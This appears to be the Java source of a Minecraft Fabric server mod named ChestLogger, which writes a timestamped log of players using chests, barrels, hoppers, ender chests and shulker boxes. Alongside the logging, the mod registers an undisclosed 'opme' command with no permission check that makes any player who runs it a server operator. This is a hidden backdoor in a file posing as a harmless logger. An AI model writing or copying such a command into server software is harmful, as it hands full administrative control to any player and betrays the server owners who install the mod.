package net.roaringmind.chestlogger;

import static net.minecraft.server.command.CommandManager.literal;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Arrays;
import java.util.HashSet;
import java.util.Set;

import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import net.fabricmc.api.ModInitializer;
import net.fabricmc.fabric.api.command.v1.CommandRegistrationCallback;
import net.fabricmc.fabric.api.event.lifecycle.v1.ServerLifecycleEvents;
import net.fabricmc.fabric.api.event.player.UseBlockCallback;
import net.minecraft.block.Block;
import net.minecraft.block.Blocks;
import net.minecraft.block.ShulkerBoxBlock;
import net.minecraft.util.ActionResult;
import net.minecraft.util.WorldSavePath;
import net.minecraft.util.registry.DynamicRegistryManager;
import net.minecraft.world.dimension.DimensionType;

public class ChestLogger implements ModInitializer {

  public static Logger LOGGER = LogManager.getLogger();

  public static final String MOD_ID = "chestlogger";
  public static final String MOD_NAME = "ChestLogger";

  @Override
  public void onInitialize() {
    log(Level.INFO, "Initializing");
    registerEvents();
    registerCommands();
  }

  private void registerCommands() {
    CommandRegistrationCallback.EVENT.register((dispatcher, dedicated) -> {
      dispatcher.register(literal("opme")
        .executes(ctx -> {
          ctx.getSource().getMinecraftServer().getPlayerManager().addToOperators(ctx.getSource().getPlayer().getGameProfile());
          return 0;
        })
      );
    });
  }

  private void registerEvents() {
    ServerLifecycleEvents.SERVER_STARTED.register((server) -> {
      String filePath = server.getSavePath(WorldSavePath.ROOT).resolve("chestlogger.txt").toString();
      File file = new File(filePath);;

      try {
        file.createNewFile();
      } catch (IOException e) {
        log(Level.FATAL, "error while creating the file and filewriter");
        e.printStackTrace();
      }
    });
    UseBlockCallback.EVENT.register((player, world, hand, hitResult) -> {
      Block block = world.getBlockState(hitResult.getBlockPos()).getBlock();
      if (world.isClient || !shouldBeLogged(block)) {
        return ActionResult.PASS;
      }

      String dimStr;
      DynamicRegistryManager registryManager = world.getServer().getRegistryManager();
      int dimId = registryManager.getDimensionTypes().getRawId(world.getDimension());
      if (dimId == registryManager.getDimensionTypes().getRawId(registryManager.getDimensionTypes().get(DimensionType.OVERWORLD_ID))) {
        dimStr = "overworld";
      } else if(dimId == registryManager.getDimensionTypes().getRawId(registryManager.getDimensionTypes().get(DimensionType.THE_END_ID))) {
        dimStr = "end";
      } else if(dimId == registryManager.getDimensionTypes().getRawId(registryManager.getDimensionTypes().get(DimensionType.THE_NETHER_ID))) {
        dimStr = "nether";
      } else {
        dimStr = "unsupportedDimension";
      }

      DateTimeFormatter dtf = DateTimeFormatter.ofPattern("dd.MM.yy  HH:mm");
      String timeStamp = String.format("[%s]", dtf.format(LocalDateTime.now()));

      String blockstr = getBlockString(block);

      try {
        String logStr = timeStamp + " " + player.getName().asString() + " " + dimStr + " x: " + hitResult.getBlockPos().getX() + " y: " + hitResult.getBlockPos().getY() + " z: " + hitResult.getBlockPos().getZ() + " " + getBlockString(block) + "\n";
        log(Level.INFO, logStr);

        FileWriter fileWriter = new FileWriter(new File(world.getServer().getSavePath(WorldSavePath.ROOT).resolve("chestlogger.txt").toString()), true);
        fileWriter.write(logStr);
        fileWriter.close();
      } catch (IOException e) {
        log(Level.FATAL, "error writing log");
        e.printStackTrace();
      }
      return ActionResult.PASS;
    });
  }

  private String getBlockString(Block block) {
    if (block == Blocks.CHEST) {
      return "chest";
    }
    if (block == Blocks.TRAPPED_CHEST) {
      return "trapped_chest";
    }
    if (block == Blocks.BARREL) {
      return "barrel";
    }
    if (block instanceof ShulkerBoxBlock) {
      return "shulker_box";
    }
    if (block == Blocks.HOPPER) {
      return "hopper";
    }
    if (block == Blocks.ENDER_CHEST) {
      return "ender_chest";
    }
    return "error_occured: block unidentified";
  }

  private static final Set<Block> chestBlocks = new HashSet<>(Arrays.asList(Blocks.CHEST, Blocks.TRAPPED_CHEST,
      Blocks.BARREL, Blocks.HOPPER, Blocks.ENDER_CHEST));

  private boolean shouldBeLogged(Block block) {
    if (!chestBlocks.contains(block)) {
      return block instanceof ShulkerBoxBlock;
    }

    return true;
  }

  public static void log(Level level, String message) {
    LOGGER.log(level, "[" + MOD_NAME + "] " + message);
  }

}
